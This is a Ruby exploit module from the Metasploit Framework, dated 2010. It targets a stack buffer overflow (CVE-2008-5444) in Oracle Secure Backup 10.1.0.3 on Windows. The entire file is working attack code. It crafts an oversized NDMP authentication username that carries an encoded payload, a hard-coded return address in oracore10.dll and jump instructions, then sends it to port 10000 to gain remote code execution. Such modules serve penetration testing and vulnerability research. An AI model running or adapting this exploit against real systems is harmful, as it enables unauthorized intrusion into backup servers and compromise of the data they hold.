##
# $Id: osb_ndmp_auth.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::NDMP

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Oracle Secure Backup NDMP_CONNECT_CLIENT_AUTH Buffer Overflow',
			'Description'    => %q{
					The module exploits a stack buffer overflow in Oracle Secure Backup.
				When sending a specially crafted NDMP_CONNECT_CLIENT_AUTH packet,
				an attacker may be able to execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-5444' ],
					[ 'OSVDB', '51340' ],
					[ 'URL', 'http://www.oracle.com/technology/deploy/security/critical-patch-updates/cpujan2009.html' ],
				],
			'Platform'       => 'win',
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
				},
			'Targets'        =>
				[
					[ 'Oracle Secure Backup 10.1.0.3 (Windows 2003 SP0/Windows XP SP3)',  { 'Ret' => 0x608f5a28 } ], # oracore10.dll
				],
			'DisclosureDate' => 'Jan 14 2009',
			'DefaultTarget' => 0))

		register_options([Opt::RPORT(10000)], self.class)
	end

	def exploit
		connect

		print_status("Trying target #{target.name}...")

		ndmp_recv()

		username =  rand_text_alphanumeric(3789 - payload.encoded.length)
		username << payload.encoded + Rex::Arch::X86.jmp_short(6)
		username << make_nops(2) + [target.ret].pack('V') + [0xe8, -850].pack('CV')
		username << rand_text_alphanumeric(5000 - 3793 - payload.encoded.length - 8 - 5)

		password = rand_text_alphanumeric(rand(25) + 1)

		# Create the authentication request
		auth = [
				0,               # Sequence number
				Time.now.to_i,   # Current time
				0,               # Message type (request)
				0x901,           # Message name (connect_client_auth)
				0,               # Reply sequence number
				0,               # Error status
				1                # Authentication type
			].pack('NNNNNNN') +
			[ username.length ].pack('N') + username +
			[ password.length ].pack('N') + password +
			[ 4 ].pack('N')

		print_status("Sending authentication request...")
		ndmp_send(auth)

		handler
		disconnect
	end

end
